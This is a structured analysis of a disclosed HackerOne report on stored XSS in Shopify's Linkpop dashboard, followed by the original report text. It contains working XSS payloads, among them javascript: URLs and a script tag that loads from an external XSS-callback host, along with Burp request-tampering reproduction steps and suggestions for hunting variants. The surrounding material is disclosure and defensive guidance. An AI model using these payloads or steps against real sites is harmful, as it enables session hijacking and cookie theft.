# Stored XSS in Linkpop Dashboard via Unsanitized URL Input

## Metadata
- **Source:** HackerOne
- **Report:** 1441988 | https://hackerone.com/reports/1441988
- **Submitted:** 2022-01-05
- **Reporter:** nagli
- **Program:** Shopify Bug Bounty (Linkpop)
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Stored XSS, Insufficient Input Validation, Client-Side Protection Bypass
- **CVEs:** None
- **Category:** web-api

## Summary
A Stored XSS vulnerability exists in the Linkpop dashboard at /dashboard/admin where user-supplied URLs and titles are not properly sanitized server-side before storage and later rendering. Attackers can bypass client-side protections using HTTP request tampering to inject malicious JavaScript that executes when the shareable link is visited, allowing session hijacking and arbitrary actions on behalf of victims.

## Attack scenario
1. Attacker logs into their Linkpop account and accesses the dashboard template creation interface
2. Attacker uses Burp Suite to intercept the HTTP request when creating/updating a link or page title
3. Attacker modifies the 'url' parameter to contain JavaScript payload (e.g., 'javascript:alert(document.domain)') or XSS in title/bio fields containing '<script>' tags
4. Attacker bypasses client-side validation by submitting the tampered request directly to the server
5. Server stores the malicious payload without sanitization in the database
6. When any user (including the victim) visits the attacker's shareable Linkpop link, the stored JavaScript executes in their browser with full access to their session

## Root cause
The application implements input validation exclusively on the client-side and fails to perform server-side sanitization or encoding when storing and rendering user-supplied data (URLs, titles, bio text). The reliance on client-side protections is fundamentally flawed as they can be trivially bypassed through HTTP request manipulation.

## Attacker mindset
An attacker would recognize that client-side validation is merely a convenience feature, not a security control. By intercepting and modifying HTTP requests, they can inject payloads that bypass frontend restrictions. The stored nature means a single injection compromises all future visitors to the attacker's page, making it a high-impact attack vector for credential theft or malware distribution.

## Defensive takeaways
- Implement mandatory server-side input validation and sanitization for all user-supplied data, regardless of client-side protections
- Use appropriate output encoding (HTML entity encoding for HTML context, JavaScript encoding for JS context) when rendering user data
- Employ a Content Security Policy (CSP) header to restrict inline script execution and limit script sources
- Validate URLs server-side using URL parsing libraries and whitelist safe protocols (http, https), rejecting javascript: and data: URIs
- Apply HTML sanitization libraries (e.g., DOMPurify, bleach) to remove or neutralize script tags and event handlers
- Implement X-XSS-Protection and X-Content-Type-Options headers as additional defense layers
- Regular security testing including automated XSS scanning and manual penetration testing of input fields
- Use templating engines with auto-escaping enabled by default

## Variant hunting
Search for similar stored XSS patterns in other Shopify-owned services (Shopify Admin, Shop app, Hydrogen). Test other user-controlled fields in Linkpop: social media handles, bio text, page slug, theme settings. Check if the GraphQL API (pageUpdate, linksCreate mutations shown in response) has the same sanitization issues when called directly. Test stored XSS in user profile fields that appear on public pages. Investigate if CORS bypass mentioned in impact statement is a separate vulnerability or consequence of XSS.

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1059.007: Command and Scripting Interpreter (JavaScript)
- T1566.002: Phishing - Spearphishing Link
- T1185: Man in the Middle (request interception aspect)
- T1539: Steal Web Session Cookie

## Notes
The report demonstrates sophisticated understanding by showing actual HTTP response with encoded payload. The attacker correctly identified this as a GraphQL-backed application. The mention of OAuth whitelisting on Shopify infrastructure suggests this could be chained with account takeover attacks. The 'SOAP BYPASS' impact claim is unclear and may refer to different vulnerability. Firefox-specific execution suggests possible browser difference in XSS filter behavior. This is a critical vulnerability as Linkpop is a social link aggregator service designed for sharing with many users, maximizing exposure.

## Full report
<details><summary>Expand</summary>

## Summary:

There is Stored XSS vulnerability at 

`https://linkpop.com/dashboard/admin` that can later be delivered through unique linkpop link.

This is due to lack of sanitizaiton and relying on client side protections when inserting urls to our applications.

This is the client side protection error:

{F1569111}

Easily bypassed just by tampering with burp

```
HTTP/1.1 200 OK
Cookies

{"data":{"pageUpdate":{"page":{"id":"12617","slug":"testnaglinagli","title":"\"\u003e\u003ch1\u003enagli\u003c/h1\u003e\"\u003e\u003cscript sr","bio":"\"\u003e\u003cScript src=https://naglinagli.xss.ht\u003e\u003c/script\u003e${7*7}{{7*7}}","media":{"id":"36361","signedBlobId":"eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBZ21PIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--84ffd51a70b79ab6faaec2d6c3e7cca38f907f30","url":"https://cdn.shopify.com/b/shopify-linkpop-prod/q85t5nppud8qfjo1dvg0ql3p01oe.png","__typename":"Media"},"themeSettings":{"backgroundColor":"#F0EFEC","fontColor":"#000","primaryFont":"Roboto","secondaryFont":""},"__typename":"Page"},"errors":null,"__typename":"PageUpdatePayload"},"linksCreate":{"page":{"id":"12617","links":[{"id":"254183","title":"\"\u003e\u003ch1\u003etesT\u003c/h1\u003e${7*7}{{7*7}}","url":"javascript:alert(document.domain)","media":{"id":"36362","signedBlobId":"eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBZ3FPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--54c67556358d19ddba24dd01f4130d1b2641b16f","url":"https://cdn.shopify.com/b/shopify-linkpop-prod/u7qrfhm16ma74bf3tvwn2lun4vn1.png","__typename":"Media"},"__typename":"ExternalLink"}],"socialMediaAccounts":[{"id":"30879","handle":"javascript:alert(1)","network":"facebook","__typename":"SocialMediaAccount"},{"id":"30878","handle":"javascript:alert(1)","network":"shop","__typename":"SocialMediaAccount"}],"__typename":"Page"},"errors":null,"__typename":"LinksCreatePayload"}}}
```

{F1569112}

{F1569113}

I reached this service of yours through some manual navigations on shopify.com and shopifycloud.com, I can see that it's also whitelisted on your OAuth redirects.

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Navigate to www.linkpop.com
  2. Login to your account
  3. Create new template
  4. Capture the request, change the "url" param to javascript:alert(document.domain)
  5. Click on "Copy Link"
  6. Now you have shareable link - click on the first image -> https://linkpop.com/testnaglinagli

The XSS worked for me on FireFox.

Best Regards

@nagli

## Impact

Cookies Exfiltration
CORS Bypass
SOAP Bypass
Executing Javascript on the victims behalf.

</details>

---
*Analysed by Claude on 2026-05-12*
